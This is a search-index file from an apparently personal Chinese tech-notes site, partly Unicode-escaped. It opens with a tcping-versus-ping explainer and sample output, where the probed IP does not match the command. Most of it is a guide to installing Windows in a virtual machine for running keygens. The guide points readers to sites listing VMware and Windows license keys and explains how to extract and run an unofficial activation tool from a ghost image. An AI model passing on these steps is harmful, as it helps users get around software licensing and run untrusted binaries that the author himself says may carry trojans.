\u7aef\u53e3\u7684\u8fde\u901a\u6027\u3002\u8bf7\u8bb0\u4f4f\uff0c\u5bf9\u4e8e\u4e0d\u5c5e\u4e8e\u60a8\u7684\u670d\u52a1\u5668\u548c\u670d\u52a1\uff0c\u8fdb\u884c\u6b64\u7c7b\u6d4b\u8bd5\u65f6\u5e94\u786e\u4fdd\u60a8\u6709\u9002\u5f53\u7684\u6743\u9650\u548c\u5408\u6cd5\u6027\u3002 tcping \u548c\u4f20\u7edf\u7684 ping \u547d\u4ee4\u5728\u529f\u80fd\u548c\u7528\u9014\u4e0a\u6709\u4e00\u4e9b\u5173\u952e\u533a\u522b\uff1a 1.\u534f\u8bae \uff1a ping \uff1a\u4f7f\u7528 ICMP (Internet Control Message Protocol) \u534f\u8bae\u3002\u5b83\u53d1\u9001 ICMP Echo Request \u6d88\u606f\u5230\u76ee\u6807\u5730\u5740\uff0c\u5982\u679c\u76ee\u6807\u54cd\u5e94\uff0c\u5219\u8fd4\u56de ICMP Echo Reply\u3002 tcping \uff1a\u4f7f\u7528 TCP (Transmission Control Protocol) \u534f\u8bae\u3002\u5b83\u5c1d\u8bd5\u5efa\u7acb\u5230\u76ee\u6807\u5730\u5740\u7684 TCP \u8fde\u63a5\uff08\u901a\u5e38\u662f\u5230\u6307\u5b9a\u7684\u7aef\u53e3\uff09\u3002 2.\u7528\u9014 \uff1a ping \uff1a\u4e3b\u8981\u7528\u4e8e\u68c0\u6d4b\u7f51\u7edc\u8fde\u901a\u6027\u3002\u5b83\u53ef\u4ee5\u544a\u8bc9\u60a8\u76ee\u6807\u673a\u5668\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\uff0c\u5e76\u63d0\u4f9b\u5f80\u8fd4\u65f6\u95f4 (RTT) \u6570\u636e\u3002 tcping \uff1a\u4e3b\u8981\u7528\u4e8e\u68c0\u6d4b\u7279\u5b9a TCP \u7aef\u53e3\u7684\u53ef\u8fbe\u6027\u548c\u54cd\u5e94\u65f6\u95f4\u3002\u5b83\u5bf9\u4e8e\u68c0\u6d4b\u7279\u5b9a\u670d\u52a1\uff08\u5982 HTTP\u3001\u6570\u636e\u5e93\u670d\u52a1\u7b49\uff09\u662f\u5426\u8fd0\u884c\u6216\u76d1\u542c\u7279\u5b9a\u7aef\u53e3\u975e\u5e38\u6709\u7528\u3002 3.\u9632\u706b\u5899\u548c\u8fc7\u6ee4 \uff1a ping \uff1a\u8bb8\u591a\u7cfb\u7edf\u548c\u7f51\u7edc\u4f1a\u963b\u6b62\u6216\u8fc7\u6ee4 ICMP \u6d41\u91cf\uff0c\u8fd9\u610f\u5473\u7740\u5373\u4f7f\u7cfb\u7edf\u5728\u7ebf\uff0cping \u4e5f\u53ef\u80fd\u5931\u8d25\u3002 tcping \uff1a\u7531\u4e8e\u8bb8\u591a\u5e94\u7528\u548c\u670d\u52a1\u4f9d\u8d56\u4e8e TCP \u8fde\u63a5\uff0cTCP \u7aef\u53e3\u901a\u5e38\u4e0d\u4f1a\u88ab\u963b\u6b62\u3002\u56e0\u6b64\uff0ctcping \u66f4\u6709\u53ef\u80fd\u5f97\u5230\u51c6\u786e\u7684\u7aef\u53e3\u53ef\u8fbe\u6027\u4fe1\u606f\u3002 4.\u8f93\u51fa\u4fe1\u606f \uff1a ping \uff1a\u63d0\u4f9b\u4e86\u76ee\u6807\u5730\u5740\u7684\u53ef\u8fbe\u6027\u3001\u6570\u636e\u5305\u5f80\u8fd4\u65f6\u95f4\u3001\u4e22\u5305\u4fe1\u606f\u7b49\u3002 tcping \uff1a\u63d0\u4f9b\u4e86\u7aef\u53e3\u7684\u5f00\u653e\u72b6\u6001\u3001\u5efa\u7acb\u8fde\u63a5\u7684\u65f6\u95f4\u7b49\uff0c\u66f4\u9002\u5408\u68c0\u6d4b\u7279\u5b9a\u670d\u52a1\u7684\u72b6\u6001\u3002 \u603b\u7ed3\u6765\u8bf4\uff0c ping \u662f\u68c0\u6d4b\u7f51\u7edc\u5c42\u7684\u8fde\u901a\u6027\u548c\u8d28\u91cf\u7684\u5de5\u5177\uff0c\u800c tcping \u662f\u68c0\u6d4b\u7279\u5b9a TCP \u7aef\u53e3\uff08\u56e0\u6b64\u662f\u7279\u5b9a\u670d\u52a1\uff09\u7684\u53ef\u8fbe\u6027\u548c\u54cd\u5e94\u65f6\u95f4\u7684\u5de5\u5177\u3002\u5728\u8bca\u65ad\u7f51\u7edc\u95ee\u9898\u65f6\uff0c\u4e24\u8005\u53ef\u4ee5\u4e92\u4e3a\u8865\u5145\u3002 \u547d\u4ee4\u7ed3\u679c\uff1a C:\\Users\\yinzhipeng>tcping.exe 172.61.222.51 80 Probing 171.220.227.81:80/tcp - Port is open - time=9.747ms Probing 171.220.227.81:80/tcp - Port is open - time=7.875ms Probing 171.220.227.81:80/tcp - Port is open - time=8.482ms Probing 171.220.227.81:80/tcp - Port is open - time=8.327ms Ping statistics for 171.220.227.81:80 4 probes sent. 4 successful, 0 failed. (0.00% fail) Approximate trip times in milli-seconds: Minimum = 7.875ms, Maximum = 9.747ms, Average = 8.608ms \u9010\u884c\u7ffb\u8bd1\u4e00\u4e0b: \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=9.747\u6beb\u79d2 \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=7.875\u6beb\u79d2 \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=8.482\u6beb\u79d2 \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=8.327\u6beb\u79d2 \u5bf9 171.220.227.81:80 \u7684 Ping \u7edf\u8ba1\u6570\u636e \u5df2\u53d1\u9001 4 \u4e2a\u63a2\u6d4b\u5305\u3002 4 \u6b21\u6210\u529f\uff0c0 \u6b21\u5931\u8d25\u3002 (\u5931\u8d25\u7387 0.00%) \u5927\u7ea6\u7684\u5f80\u8fd4\u65f6\u95f4\uff08\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff09\uff1a \u6700\u5c0f\u503c = 7.875\u6beb\u79d2\uff0c\u6700\u5927\u503c = 9.747\u6beb\u79d2\uff0c\u5e73\u5747\u503c = 8.608\u6beb\u79d2","title":"tcping"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/","text":"\u865a\u62df\u673a\u5b89\u88c5Microsoft Windows \u56e0\u4e3a\u81ea\u5df1\u5076\u5c14\u8981\u4e0b\u8f7d\u6ce8\u518c\u673a\u7b49\u4e1c\u897f\uff0c\u6709\u4e9b\u65e0\u826f\u8f6f\u4ef6\u5236\u4f5c\u8005\u4f1a\u7ed9\u6ce8\u518c\u673a\u52a0\u6728\u9a6c\u7684\u58f3\u6216\u8005\u4e00\u4e9b\u75c5\u6bd2\uff0c\u4e3a\u4e86\u80fd\u6b63\u5e38\u4f7f\u7528\u6ce8\u518c\u673a\uff0c\u9632\u6b62\u81ea\u5df1\u7684\u4e3b\u673a\u4e2d\u62db\uff0c\u53ef\u4ee5\u5728\u865a\u62df\u673a\u4e2d\u5b89\u88c5Windows\uff0c\u5728\u865a\u62df\u673a\u4e2d\u7684Windows\u4f7f\u7528\u5404\u79cd\u6ce8\u518c\u673a\u3002\u5373\u4f7f\u6709\u75c5\u6bd2\uff0c\u4e5f\u662f\u865a\u62df\u673a\u4e2d\u7684Windows\u611f\u67d3\uff0c\u4e0d\u4f1a\u5f71\u54cd\u81ea\u5df1\u771f\u6b63\u7684\u4e3b\u673a\u3002\u6478\u7d22\u4e86\u4e00\u6bb5\u65f6\u95f4\uff0c\u5728\u8fd9\u8bb0\u5f55\u4e0b 1\u3001\u771f\u5b9e\u4e3b\u673a\u662f Windows \u4ee5\u5b89\u88c5Windows10\u4e3a\u4f8b \uff081\uff09\u5b89\u88c5\u865a\u62df\u673a \u5982\u679c\u771f\u5b9e\u4e3b\u673a\u662f Windows \uff0c\u90a3\u4e48\u5c31\u4e0b\u8f7d VMware Workstation 16 Pro \uff0c\u5b98\u7f51\u5730\u5740\uff1ahttps://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html\uff0c\u5b89\u88c5\u65f6\u5b89\u88c5\u9009\u9879\u5168\u90e8\u9009\u62e9\u9ed8\u8ba4\u5c31\u53ef\u4ee5\uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u662f\u6536\u8d39\u7684\uff0c\u53ef\u4ee5\u8bd5\u7528\uff0c\u4e5f\u53ef\u4ee5\u8f93\u5165\u6ce8\u518c\u7801\uff0c VMware Workstation 16 Pro \u6ce8\u518c\u7801\u5728\u7f51\u4e0a\u53ef\u4ee5\u641c\u5230\uff0c\u6bd4\u5982\u8fd9\u79cd http://www.win7zhijia.cn/win10jc/win10_46025.html \uff082\uff09\u4e0b\u8f7dWindows10 \u5728\u4e00\u4e2a\u540d\u4e3a \u6211\u544a\u8bc9\u4f60 \u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u5230\u4e00\u5207\u8ddfMicrosoft\u76f8\u5173\u7684\u4e1c\u897f\u3002https://msdn.itellyou.cn/ \u4e0b\u8f7dWindows10\u955c\u50cf\uff0c\u4e0b\u56fe\u4e2d\u9009\u62e9Windows10 1909\u7248\u672c\uff08\u540e\u9762\u6570\u5b57\u8d8a\u5927\u8d8a\u65b0\uff09\uff0cconsumer editions\uff08\u6d88\u8d39\u8005\u7248\u672c\uff09\uff0ced2k\u5f00\u5934\u7684\u9009\u4e2d\u90e8\u5206\u590d\u5236\u5230 \u8fc5\u96f7 \u4e2d\u5373\u53ef\u4e0b\u8f7d \uff083\uff09\u7528\u865a\u62df\u673a\u5b89\u88c5Windows10 \u5728 VMware Workstation 16 Pro \u4e2d\uff0c \u6587\u4ef6 --> \u65b0\u5efa\u865a\u62df\u673a \uff0c\u9009\u62e9 \u5178\u578b \u9009\u62e9 \u7a0d\u540e\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf \uff0c\u5168\u90e8\u4e0b\u4e00\u6b65\u5373\u53ef\uff0c\u65b0\u5efa\u5b8c\u865a\u62df\u673a\u3002\u53f3\u952e\u865a\u62df\u673a\uff0c\u9009\u62e9 \u8bbe\u7f6e \uff0c\u8c03\u6574\u4e0b\u5185\u5b58\u5927\u5c0f\uff0c\u8981\u5927\u4e8e1G\u3002 \u8bbe\u7f6e \u4e2d\u9009\u62e9 CD/DVD \uff0c\u8bbe\u7f6e \u542f\u52a8\u65f6\u8fde\u63a5 \uff0c\u4f7f\u7528 ISO\u6620\u50cf\u6587\u4ef6 \uff0c\u9009\u62e9\u4e0a\u4e00\u6b65\u4e2d\u4e0b\u8f7d\u7684Windows10\u955c\u50cf\uff0c\u70b9\u51fb\u786e\u5b9a\uff0c\u7136\u540e\u542f\u52a8\u865a\u62df\u673a Windows10\u5b89\u88c5\u8fc7\u7a0b\u5f88\u7b80\u5355\uff0c\u865a\u62df\u673a\u5f00\u673a\u4e4b\u540e\uff0c\u6309\u7167\u63d0\u793a\uff0c\u57fa\u672c\u9ed8\u8ba4\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u884c\u3002 \uff084\uff09\u6fc0\u6d3bWindows10 Windows\u7684\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u5bc6\u5319\uff08\u6ce8\u518c\u7801\uff09\u6fc0\u6d3b\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\u3002 \u5bc6\u5319\u5728\u7f51\u4e0a\u57fa\u672c\u53ef\u4ee5\u641c\u5230\u80fd\u7528\u7684\uff0c\u4f8b\u5982\u8fd9\u4e2a http://www.xitongcheng.com/jiaocheng/win10_article_55870.html?_360safeparam=647461812 \u5bc6\u5319\u8f93\u5165\u5728Windows \u8bbe\u7f6e \u4e2d\uff0c \u7cfb\u7edf --> \u5173\u4e8e \u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\uff0c\u653e\u5728\u6587\u7ae0\u6700\u540e\u3002 2\u3001\u771f\u5b9e\u4e3b\u673a\u662f Mac \uff081\uff09\u5b89\u88c5\u865a\u62df\u673a \u5982\u679c\u771f\u5b9e\u4e3b\u673a\u662f Mac \uff0c\u90a3\u4e48\u5c31\u4e0b\u8f7d VirtualBox \uff0c\u5b98\u7f51\u5730\u5740\uff1ahttps://www.virtualbox.org/ \u5b89\u88c5\u65f6\u5b89\u88c5\u9009\u9879\u5168\u90e8\u9009\u62e9\u9ed8\u8ba4\u5c31\u53ef\u4ee5\uff0c\u8fd9\u6b3e\u8f6f\u4ef6\u662f\u514d\u8d39\u7684\u3002 \uff082\uff09\u4e0b\u8f7dWindows10 \u5728\u4e00\u4e2a\u540d\u4e3a \u6211\u544a\u8bc9\u4f60 \u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u5230\u4e00\u5207\u8ddfMicrosoft\u76f8\u5173\u7684\u4e1c\u897f\u3002https://msdn.itellyou.cn/ \u4e0b\u8f7dWindows10\u955c\u50cf\uff0c\u4e0b\u56fe\u4e2d\u9009\u62e9Windows10 1909\u7248\u672c\uff08\u540e\u9762\u6570\u5b57\u8d8a\u5927\u8d8a\u65b0\uff09\uff0cconsumer editions\uff08\u6d88\u8d39\u8005\u7248\u672c\uff09\uff0ced2k\u5f00\u5934\u7684\u9009\u4e2d\u90e8\u5206\u590d\u5236\u5230 \u8fc5\u96f7 \u4e2d\u5373\u53ef\u4e0b\u8f7d \uff083\uff09\u7528\u865a\u62df\u673a\u5b89\u88c5Windows10 \u6c49\u5316\uff1a VirtualBox --> \u5168\u5c40\u8bbe\u7f6e --> \u8bed\u8a00 --> \u4e2d\u6587 \u65b0\u5efa \uff0c\u8f93\u5165\u540d\u79f0\uff0c\u5185\u5b58\u8bbe\u7f6e\u5927\u4e8e1G\uff0c\u5269\u4e0b\u90fd\u70b9\u4e0b\u4e00\u6b65\u5c31\u884c\uff0c\u7136\u540e\u5728\u65b0\u5efa\u7684\u865a\u62df\u673a\u4e2d\uff0c\u5149\u9a71\u9009\u62e9\u4e0a\u4e00\u6b65\u4e2d\u4e0b\u8f7d\u7684Windows10\u955c\u50cf\u6587\u4ef6 Windows10\u5b89\u88c5\u8fc7\u7a0b\u5f88\u7b80\u5355\uff0c\u865a\u62df\u673a\u5f00\u673a\u4e4b\u540e\uff0c\u6309\u7167\u63d0\u793a\uff0c\u57fa\u672c\u9ed8\u8ba4\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u884c\u3002 \uff084\uff09\u6fc0\u6d3bWindows10 Windows\u7684\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u5bc6\u5319\uff08\u6ce8\u518c\u7801\uff09\u6fc0\u6d3b\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\u3002 \u5bc6\u5319\u5728\u7f51\u4e0a\u57fa\u672c\u53ef\u4ee5\u641c\u5230\u80fd\u7528\u7684\uff0c\u4f8b\u5982\u8fd9\u4e2a http://www.xitongcheng.com/jiaocheng/win10_article_55870.html?_360safeparam=647461812 \u5bc6\u5319\u8f93\u5165\u5728Windows \u8bbe\u7f6e \u4e2d\uff0c \u7cfb\u7edf --> \u5173\u4e8e \u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\uff0c\u653e\u5728\u6587\u7ae0\u6700\u540e\u3002 \u5de5\u5177\u6fc0\u6d3b \u4ee5Windows10\u4e3a\u4f8b \u5de5\u5177\u7684\u83b7\u53d6\uff1ahttp://www.jsgho.net/win10/ \u4e0a\u4e0b\u8f7d\u4e00\u4e2aWindows10 \u955c\u50cf\uff0c\u9009\u62e9 ghost \u5f00\u5934\u7684\u955c\u50cf\uff0c\u4e0d\u8981 \u5b89\u88c5\u7248 \u4f8b\u5982\u8fd9\u4e2a\uff1a \u4e0b\u8f7d\u5b8c\u6210\u4e4b\u540e\uff0c\u53ef\u4ee5\u7528 360zip https://yasuo.360.cn \u514d\u8d39\u65e0\u5e7f\u544a\u3002\u8fd9\u4e2a\u5de5\u5177\u8fdb\u884c\u89e3\u538b\u3002\u89e3\u538b\u955c\u50cf\u6587\u4ef6 \u7136\u540e\u4e0b\u8f7dghos explorer \uff0c\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://baoku.360.cn/soft/show/appid/1900006143 \uff0c\u9009\u62e9 \u666e\u901a\u4e0b\u8f7d \u5373\u53ef\uff0c\u8fd9\u4e2a\u5de5\u5177\u7684\u5b98\u65b9\u7f51\u7ad9\u5df2\u7ecf\u4e0d\u5b58\u5728\uff0c\u56e0\u4e3a\u51fa\u54c1\u8fd9\u4e2a\u5de5\u5177\u7684\u5de5\u5177\u7684\u516c\u53f8\u88ab\u6536\u8d2d\u4e86\uff0c\u7f51\u7ad9\u8fdb\u884c\u4e86\u91cd\u7ec4\uff0c\u539f\u5b98\u7f51\u5730\u5740\u4e3a\uff1ahttp://www.symantec.com/themes/ghost/index.jsp \uff0c\u5b89\u88c5\u9009\u9879\u5168\u90e8\u9ed8\u8ba4\u5373\u53ef \u7528ghos explorer\u6253\u5f00\u521a\u624d\u4e0b\u8f7d\u597d\u7684\u955c\u50cf\u7684\u89e3\u538b\u76ee\u5f55\uff0c\u9009\u62e9\u89e3\u538b\u76ee\u5f55\u4e2d.GHO\u7ed3\u5c3e\u7684\u6587\u4ef6\u3002 \u5728GHO\u6587\u4ef6\u4e2d\uff0c\u6253\u5f00\u8def\u5f84\u4e3aUsers\\Administrator\\Desktop\uff0c\u5373\u53ef\u627e\u5230\u6fc0\u6d3b\u5de5\u5177\uff0c\u62d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86\u3002 \u628a\u8be5\u6fc0\u6d3b\u5de5\u5177\uff0c\u590d\u5236\u5230\u672a\u6fc0\u6d3b\u7684Windows10\u91cc\u9762\uff0c\u76f4\u63a5\u6253\u5f00\uff0c\u6309\u7167\u63d0\u793a\u5c31\u53ef\u4ee5\u6fc0\u6d3b\u4e86\u3002","title":"\u865a\u62df\u673a\u5b89\u88c5Windows"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#microsoft-windows","text":"\u56e0\u4e3a\u81ea\u5df1\u5076\u5c14\u8981\u4e0b\u8f7d\u6ce8\u518c\u673a\u7b49\u4e1c\u897f\uff0c\u6709\u4e9b\u65e0\u826f\u8f6f\u4ef6\u5236\u4f5c\u8005\u4f1a\u7ed9\u6ce8\u518c\u673a\u52a0\u6728\u9a6c\u7684\u58f3\u6216\u8005\u4e00\u4e9b\u75c5\u6bd2\uff0c\u4e3a\u4e86\u80fd\u6b63\u5e38\u4f7f\u7528\u6ce8\u518c\u673a\uff0c\u9632\u6b62\u81ea\u5df1\u7684\u4e3b\u673a\u4e2d\u62db\uff0c\u53ef\u4ee5\u5728\u865a\u62df\u673a\u4e2d\u5b89\u88c5Windows\uff0c\u5728\u865a\u62df\u673a\u4e2d\u7684Windows\u4f7f\u7528\u5404\u79cd\u6ce8\u518c\u673a\u3002\u5373\u4f7f\u6709\u75c5\u6bd2\uff0c\u4e5f\u662f\u865a\u62df\u673a\u4e2d\u7684Windows\u611f\u67d3\uff0c\u4e0d\u4f1a\u5f71\u54cd\u81ea\u5df1\u771f\u6b63\u7684\u4e3b\u673a\u3002\u6478\u7d22\u4e86\u4e00\u6bb5\u65f6\u95f4\uff0c\u5728\u8fd9\u8bb0\u5f55\u4e0b","title":"\u865a\u62df\u673a\u5b89\u88c5Microsoft Windows"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#1windows","text":"\u4ee5\u5b89\u88c5Windows10\u4e3a\u4f8b","title":"1\u3001\u771f\u5b9e\u4e3b\u673a\u662fWindows"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#1","text":"\u5982\u679c\u771f\u5b9e\u4e3b\u673a\u662f Windows \uff0c\u90a3\u4e48\u5c31\u4e0b\u8f7d VMware Workstation 16 Pro \uff0c\u5b98\u7f51\u5730\u5740\uff1ahttps://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html\uff0c\u5b89\u88c5\u65f6\u5b89\u88c5\u9009\u9879\u5168\u90e8\u9009\u62e9\u9ed8\u8ba4\u5c31\u53ef\u4ee5\uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u662f\u6536\u8d39\u7684\uff0c\u53ef\u4ee5\u8bd5\u7528\uff0c\u4e5f\u53ef\u4ee5\u8f93\u5165\u6ce8\u518c\u7801\uff0c VMware Workstation 16 Pro \u6ce8\u518c\u7801\u5728\u7f51\u4e0a\u53ef\u4ee5\u641c\u5230\uff0c\u6bd4\u5982\u8fd9\u79cd http://www.win7zhijia.cn/win10jc/win10_46025.html","title":"\uff081\uff09\u5b89\u88c5\u865a\u62df\u673a"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#2windows10","text":"\u5728\u4e00\u4e2a\u540d\u4e3a \u6211\u544a\u8bc9\u4f60 \u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u5230\u4e00\u5207\u8ddfMicrosoft\u76f8\u5173\u7684\u4e1c\u897f\u3002https://msdn.itellyou.cn/ \u4e0b\u8f7dWindows10\u955c\u50cf\uff0c\u4e0b\u56fe\u4e2d\u9009\u62e9Windows10 1909\u7248\u672c\uff08\u540e\u9762\u6570\u5b57\u8d8a\u5927\u8d8a\u65b0\uff09\uff0cconsumer editions\uff08\u6d88\u8d39\u8005\u7248\u672c\uff09\uff0ced2k\u5f00\u5934\u7684\u9009\u4e2d\u90e8\u5206\u590d\u5236\u5230 \u8fc5\u96f7 \u4e2d\u5373\u53ef\u4e0b\u8f7d","title":"\uff082\uff09\u4e0b\u8f7dWindows10"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#3windows10","text":"\u5728 VMware Workstation 16 Pro \u4e2d\uff0c \u6587\u4ef6 --> \u65b0\u5efa\u865a\u62df\u673a \uff0c\u9009\u62e9 \u5178\u578b \u9009\u62e9 \u7a0d\u540e\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf \uff0c\u5168\u90e8\u4e0b\u4e00\u6b65\u5373\u53ef\uff0c\u65b0\u5efa\u5b8c\u865a\u62df\u673a\u3002\u53f3\u952e\u865a\u62df\u673a\uff0c\u9009\u62e9 \u8bbe\u7f6e \uff0c\u8c03\u6574\u4e0b\u5185\u5b58\u5927\u5c0f\uff0c\u8981\u5927\u4e8e1G\u3002 \u8bbe\u7f6e \u4e2d\u9009\u62e9 CD/DVD \uff0c\u8bbe\u7f6e \u542f\u52a8\u65f6\u8fde\u63a5 \uff0c\u4f7f\u7528 ISO\u6620\u50cf\u6587\u4ef6 \uff0c\u9009\u62e9\u4e0a\u4e00\u6b65\u4e2d\u4e0b\u8f7d\u7684Windows10\u955c\u50cf\uff0c\u70b9\u51fb\u786e\u5b9a\uff0c\u7136\u540e\u542f\u52a8\u865a\u62df\u673a Windows10\u5b89\u88c5\u8fc7\u7a0b\u5f88\u7b80\u5355\uff0c\u865a\u62df\u673a\u5f00\u673a\u4e4b\u540e\uff0c\u6309\u7167\u63d0\u793a\uff0c\u57fa\u672c\u9ed8\u8ba4\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u884c\u3002","title":"\uff083\uff09\u7528\u865a\u62df\u673a\u5b89\u88c5Windows10"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#4windows10","text":"Windows\u7684\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u5bc6\u5319\uff08\u6ce8\u518c\u7801\uff09\u6fc0\u6d3b\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\u3002 \u5bc6\u5319\u5728\u7f51\u4e0a\u57fa\u672c\u53ef\u4ee5\u641c\u5230\u80fd\u7528\u7684\uff0c\u4f8b\u5982\u8fd9\u4e2a http://www.xitongcheng.com/jiaocheng/win10_article_55870.html?_360safeparam=647461812 \u5bc6\u5319\u8f93\u5165\u5728Windows \u8bbe\u7f6e \u4e2d\uff0c \u7cfb\u7edf --> \u5173\u4e8e \u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\uff0c\u653e\u5728\u6587\u7ae0\u6700\u540e\u3002","title":"\uff084\uff09\u6fc0\u6d3bWindows10"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#2mac","text":"","title":"2\u3001\u771f\u5b9e\u4e3b\u673a\u662fMac"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#1_1","text":"\u5982\u679c\u771f\u5b9e\u4e3b\u673a\u662f Mac \uff0c\u90a3\u4e48\u5c31\u4e0b\u8f7d VirtualBox \uff0c\u5b98\u7f51\u5730\u5740\uff1ahttps://www.virtualbox.org/ \u5b89\u88c5\u65f6\u5b89\u88c5\u9009\u9879\u5168\u90e8\u9009\u62e9\u9ed8\u8ba4\u5c31\u53ef\u4ee5\uff0c\u8fd9\u6b3e\u8f6f\u4ef6\u662f\u514d\u8d39\u7684\u3002","title":"\uff081\uff09\u5b89\u88c5\u865a\u62df\u673a"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#2windows10_1","text":"\u5728\u4e00\u4e2a\u540d\u4e3a \u6211\u544a\u8bc9\u4f60 \u7684\u7f51\u7ad9\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u5230\u4e00\u5207\u8ddfMicrosoft\u76f8\u5173\u7684\u4e1c\u897f\u3002https://msdn.itellyou.cn/ \u4e0b\u8f7dWindows10\u955c\u50cf\uff0c\u4e0b\u56fe\u4e2d\u9009\u62e9Windows10 1909\u7248\u672c\uff08\u540e\u9762\u6570\u5b57\u8d8a\u5927\u8d8a\u65b0\uff09\uff0cconsumer editions\uff08\u6d88\u8d39\u8005\u7248\u672c\uff09\uff0ced2k\u5f00\u5934\u7684\u9009\u4e2d\u90e8\u5206\u590d\u5236\u5230 \u8fc5\u96f7 \u4e2d\u5373\u53ef\u4e0b\u8f7d","title":"\uff082\uff09\u4e0b\u8f7dWindows10"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#3windows10_1","text":"\u6c49\u5316\uff1a VirtualBox --> \u5168\u5c40\u8bbe\u7f6e --> \u8bed\u8a00 --> \u4e2d\u6587 \u65b0\u5efa \uff0c\u8f93\u5165\u540d\u79f0\uff0c\u5185\u5b58\u8bbe\u7f6e\u5927\u4e8e1G\uff0c\u5269\u4e0b\u90fd\u70b9\u4e0b\u4e00\u6b65\u5c31\u884c\uff0c\u7136\u540e\u5728\u65b0\u5efa\u7684\u865a\u62df\u673a\u4e2d\uff0c\u5149\u9a71\u9009\u62e9\u4e0a\u4e00\u6b65\u4e2d\u4e0b\u8f7d\u7684Windows10\u955c\u50cf\u6587\u4ef6 Windows10\u5b89\u88c5\u8fc7\u7a0b\u5f88\u7b80\u5355\uff0c\u865a\u62df\u673a\u5f00\u673a\u4e4b\u540e\uff0c\u6309\u7167\u63d0\u793a\uff0c\u57fa\u672c\u9ed8\u8ba4\u4e0b\u4e00\u6b65\u4e0b\u4e00\u6b65\u5c31\u884c\u3002","title":"\uff083\uff09\u7528\u865a\u62df\u673a\u5b89\u88c5Windows10"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#4windows10_1","text":"Windows\u7684\u6fc0\u6d3b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u5bc6\u5319\uff08\u6ce8\u518c\u7801\uff09\u6fc0\u6d3b\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\u3002 \u5bc6\u5319\u5728\u7f51\u4e0a\u57fa\u672c\u53ef\u4ee5\u641c\u5230\u80fd\u7528\u7684\uff0c\u4f8b\u5982\u8fd9\u4e2a http://www.xitongcheng.com/jiaocheng/win10_article_55870.html?_360safeparam=647461812 \u5bc6\u5319\u8f93\u5165\u5728Windows \u8bbe\u7f6e \u4e2d\uff0c \u7cfb\u7edf --> \u5173\u4e8e \u901a\u8fc7\u5de5\u5177\u6fc0\u6d3b\uff0c\u653e\u5728\u6587\u7ae0\u6700\u540e\u3002","title":"\uff084\uff09\u6fc0\u6d3bWindows10"},{"location":"system/windows/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85windows/#_1","text":"\u4ee5Windows10\u4e3a\u4f8b \u5de5\u5177\u7684\u83b7\u53d6\uff1ahttp://www.jsgho.net/win10/ \u4e0a\u4e0b\u8f7d\u4e00\u4e2aWindows10 \u955c\u50cf\uff0c\u9009\u62e9 ghost \u5f00\u5934\u7684\u955c\u50cf\uff0c\u4e0d\u8981 \u5b89\u88c5\u7248 \u4f8b\u5982\u8fd9\u4e2a\uff1a 